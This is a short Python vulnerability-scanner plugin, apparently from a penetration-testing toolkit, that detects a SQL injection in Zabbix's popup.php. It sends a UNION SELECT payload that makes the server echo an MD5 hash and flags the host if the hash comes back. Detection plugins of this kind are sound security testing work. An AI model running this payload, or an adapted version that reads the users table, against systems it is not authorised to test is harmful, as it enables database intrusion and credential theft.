#!/usr/bin/env python
# -*- coding: utf-8 -*-

from lib.poc.dummy import *


@http_scan
async def do_scan(ip, port, service, is_http, task_msg):
    if service != 'http':
        return
    try:
        payload = "/popup.php?dstfrm=form_scenario&dstfld1=application&srctbl=applications&" \
                  "srcfld1=name&only_hostid=-1))%20" \
                  "union%20select%201,group_concat(md5('123'))%20from%20users%23"
        url = 'http://%s:%s' % (ip, port) + payload

        r = await http_client(ip, port).get(url, headers={"User-Agent": GLOBAL_USER_AGENT}, timeout=20)

        if r.status_code == 200:
            m = re.search("202cb962ac59075b964b07152d234b70", r.text)
            if m:
                ret = {
                    'alert_group': 'Zabbix SQL Injection',
                    'affects': 'http://%s:%s' % (ip, port),
                    'details': 'Zabbix popup.php SQL Injection:\n\n%s' % url
                }
                return ret
    except Exception as e:
        debug(e)


if __name__ == '__main__':
    scan = do_scan('easypen-test.lijiejie.com', 8043, 'http', True, task_msg={})
    run_plugin_test(scan)
